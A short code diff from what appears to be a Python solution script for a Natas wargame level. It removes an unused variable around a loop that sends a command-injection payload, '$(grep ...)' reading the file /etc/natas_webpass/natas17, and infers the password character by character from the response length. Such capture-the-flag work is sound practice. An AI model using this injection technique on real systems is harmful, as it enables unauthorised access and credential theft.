@@ -13,7 +13,6 @@ def extract_password(url, auth, proxies):
                 
                 payload = f"$(grep ^{secret}{char} /etc/natas_webpass/natas17)&submit=Search"
                 response = r.get(url+payload, auth=auth, proxies=proxies).headers['Content-Length']
-                response_length = response
                 
                 if response != "461983":
                     secret += char
